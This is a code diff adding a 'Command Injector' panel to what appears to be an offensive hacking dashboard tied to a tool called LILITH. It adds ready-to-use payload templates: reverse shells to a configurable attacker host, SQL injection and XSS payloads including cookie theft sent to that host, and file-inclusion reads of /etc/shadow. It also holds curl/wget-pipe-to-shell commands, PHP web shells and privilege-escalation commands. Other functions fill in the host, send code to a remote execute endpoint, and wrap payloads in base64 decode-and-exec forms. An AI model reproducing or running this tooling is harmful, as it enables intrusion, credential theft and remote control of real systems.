@@ -2782,6 +2782,261 @@ MASTER_TEMPLATE = """
             }
         }
         
+        // ==================== COMMAND INJECTOR FUNCTIONS ====================
+        
+        const INJECTION_TEMPLATES = {
+            revshell: `# Bash Reverse Shell
+bash -i >& /dev/tcp/LHOST/LPORT 0>&1
+
+# Python Reverse Shell
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+
+# Netcat Reverse Shell
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f`,
+            
+            sqli: `-- Basic SQL Injection Payloads
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+" OR "1"="1
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT username,password FROM users--
+1' AND (SELECT COUNT(*) FROM users) > 0--
+1' AND SUBSTRING(username,1,1)='a' FROM users--
+'; DROP TABLE users;--`,
+
+            xss: `<!-- XSS Payloads -->
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+<body onload=alert('XSS')>
+javascript:alert('XSS')
+<iframe src="javascript:alert('XSS')">
+<input onfocus=alert('XSS') autofocus>
+<marquee onstart=alert('XSS')>
+<details open ontoggle=alert('XSS')>
+<img src=x onerror="fetch('http://LHOST/?c='+document.cookie)">`,
+
+            lfi: `# Local File Inclusion Payloads
+../../../etc/passwd
+....//....//....//etc/passwd
+..%252f..%252f..%252fetc/passwd
+....//....//....//etc/shadow
+/proc/self/environ
+/var/log/apache2/access.log
+php://filter/convert.base64-encode/resource=index.php
+php://input
+data://text/plain,<?php system($_GET['cmd']); ?>
+expect://id`,
+
+            rce: `# Remote Code Execution Payloads
+; id
+| id
+\` id \`
+$(id)
+; cat /etc/passwd
+| cat /etc/passwd
+; wget http://LHOST/shell.sh | bash
+; curl http://LHOST/shell.sh | sh
+\${IFS}id
+{${IFS}cat,/etc/passwd}`,
+
+            webshell: `<?php
+// Simple PHP Web Shell
+if(isset($_REQUEST['cmd'])){
+    echo "<pre>";
+    $cmd = ($_REQUEST['cmd']);
+    system($cmd);
+    echo "</pre>";
+    die;
+}
+?>
+
+<?php eval($_POST['cmd']); ?>
+<?php system($_GET['cmd']); ?>
+<?php passthru($_REQUEST['cmd']); ?>
+<?php echo shell_exec($_GET['e']); ?>`,
+
+            privesc: `# Linux Privilege Escalation Commands
+whoami && id
+uname -a
+cat /etc/passwd
+cat /etc/shadow
+sudo -l
+find / -perm -4000 2>/dev/null
+find / -writable -type d 2>/dev/null
+getcap -r / 2>/dev/null
+ps aux | grep root
+cat /etc/crontab
+ls -la /etc/cron*`,
+
+            enumeration: `# System Enumeration
+hostname && whoami && id
+uname -a
+cat /etc/os-release
+ip a
+netstat -tulpn
+ps aux
+env
+cat /etc/passwd
+cat /etc/hosts
+ls -la /home
+find / -name "*.txt" 2>/dev/null | head -20
+find / -name "*.conf" 2>/dev/null | head -20`
+        };
+        
+        function loadTemplate(type) {
+            let template = INJECTION_TEMPLATES[type] || '';
+            const lhost = document.getElementById('payload-lhost')?.value || 'LHOST';
+            const lport = document.getElementById('payload-lport')?.value || '4444';
+            template = template.replace(/LHOST/g, lhost).replace(/LPORT/g, lport);
+            document.getElementById('inject-code').value = template;
+            
+            // Set appropriate type
+            const typeMap = {
+                'revshell': 'bash',
+                'sqli': 'sql',
+                'xss': 'xss',
+                'lfi': 'bash',
+                'rce': 'bash',
+                'webshell': 'python',
+                'privesc': 'bash',
+                'enumeration': 'bash'
+            };
+            document.getElementById('inject-type').value = typeMap[type] || 'bash';
+            addLog('[INJECTOR] Loaded ' + type + ' template');
+        }
+        
+        function clearInjector() {
+            document.getElementById('inject-code').value = '';
+            document.getElementById('inject-output').style.display = 'none';
+        }
+        
+        function copyInjectorCode() {
+            const code = document.getElementById('inject-code').value;
+            navigator.clipboard.writeText(code).then(() => {
+                addLog('[INJECTOR] Code copied to clipboard');
+                alert('Code copied to clipboard!');
+            });
+        }
+        
+        async function executeInjection() {
+            const code = document.getElementById('inject-code').value;
+            const type = document.getElementById('inject-type').value;
+            
+            if (!code.trim()) {
+                alert('Enter code to execute');
+                return;
+            }
+            
+            const output = document.getElementById('inject-output');
+            output.style.display = 'block';
+            output.innerHTML = '<span style="color: #ffff00;">Executing...</span>';
+            addLog('[INJECTOR] Executing ' + type + ' code');
+            
+            try {
+                const response = await fetch('/_dash/injector/execute', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ code: code, type: type })
+                });
+                const data = await response.json();
+                
+                if (data.success) {
+                    output.innerHTML = '<span style="color: #00ff00;">✓ Success:</span>\\n' + (data.output || 'No output');
+                } else {
+                    output.innerHTML = '<span style="color: #ff0000;">✗ Error:</span>\\n' + (data.error || 'Unknown error');
+                }
+            } catch (e) {
+                output.innerHTML = '<span style="color: #ff0000;">✗ Error:</span>\\n' + e.message;
+            }
+        }
+        
+        async function testInjection() {
+            const code = document.getElementById('inject-code').value;
+            const type = document.getElementById('inject-type').value;
+            
+            const output = document.getElementById('inject-output');
+            output.style.display = 'block';
+            output.innerHTML = '<span style="color: #ffff00;">Testing syntax...</span>';
+            
+            try {
+                const response = await fetch('/_dash/injector/test', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ code: code, type: type })
+                });
+                const data = await response.json();
+                
+                if (data.valid) {
+                    output.innerHTML = '<span style="color: #00ff00;">✓ Syntax Valid</span>\\n' + (data.message || '');
+                } else {
+                    output.innerHTML = '<span style="color: #ff0000;">✗ Syntax Error:</span>\\n' + (data.error || 'Invalid syntax');
+                }
+            } catch (e) {
+                output.innerHTML = '<span style="color: #ff0000;">✗ Test Error:</span>\\n' + e.message;
+            }
+        }
+        
+        function encodePayload() {
+            const code = document.getElementById('inject-code').value;
+            const type = document.getElementById('inject-type').value;
+            const output = document.getElementById('inject-output');
+            output.style.display = 'block';
+            
+            // Base64 encode
+            const b64 = btoa(code);
+            
+            let encoded = '=== ENCODED PAYLOADS ===\\n\\n';
+            encoded += '-- Base64 --\\n' + b64 + '\\n\\n';
+            encoded += '-- URL Encoded --\\n' + encodeURIComponent(code) + '\\n\\n';
+            
+            if (type === 'bash') {
+                encoded += '-- Bash Base64 Decode & Exec --\\n';
+                encoded += 'echo ' + b64 + ' | base64 -d | bash\\n\\n';
+            }
+            if (type === 'python') {
+                encoded += '-- Python Base64 Exec --\\n';
+                encoded += 'python3 -c "import base64;exec(base64.b64decode(\\"' + b64 + '\\"))"\\n\\n';
+            }
+            if (type === 'powershell') {
+                encoded += '-- PowerShell Base64 --\\n';
+                encoded += 'powershell -enc ' + btoa(unescape(encodeURIComponent(code))) + '\\n\\n';
+            }
+            
+            output.innerHTML = encoded;
+            addLog('[INJECTOR] Payload encoded');
+        }
+        
+        async function saveToMemory() {
+            const code = document.getElementById('inject-code').value;
+            const type = document.getElementById('inject-type').value;
+            
+            try {
+                const response = await fetch('/_dash/memory/save-exploit', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        name: 'Injector-' + type + '-' + Date.now(),
+                        code: code,
+                        category: type,
+                        description: 'Saved from Command Injector'
+                    })
+                });
+                const data = await response.json();
+                
+                if (data.success) {
+                    addLog('[MEMORY] Saved to LILITH memory');
+                    alert('Saved to LILITH memory!');
+                } else {
+                    alert('Failed to save: ' + data.error);
+                }
+            } catch (e) {
+                alert('Error saving: ' + e.message);
+            }
+        }
+        
         async function generateReverseShell() {
             const lhost = document.getElementById('payload-lhost').value;
             const lport = parseInt(document.getElementById('payload-lport').value) || 4444;
